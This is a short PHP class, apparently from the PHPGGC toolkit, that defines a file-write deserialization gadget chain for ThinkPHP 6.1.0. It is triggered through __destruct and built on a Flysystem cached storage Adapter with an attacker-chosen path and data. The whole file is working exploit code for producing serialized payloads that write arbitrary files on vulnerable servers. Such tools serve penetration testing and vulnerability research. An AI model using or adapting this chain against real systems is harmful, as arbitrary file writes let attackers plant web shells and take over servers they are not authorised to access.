<?php

namespace GadgetChain\ThinkPHP;

class FW3 extends \PHPGGC\GadgetChain\FileWrite
{
    public static $version = '6.1.0';
    public static $vector = '__destruct';
    public static $author = 'CyanM0un';

    public function generate(array $parameters)
    {
        $path = $parameters['remote_path'];
        $data = $parameters['data'];

        return new \League\Flysystem\Cached\Storage\Adapter($path, $data);
    }
}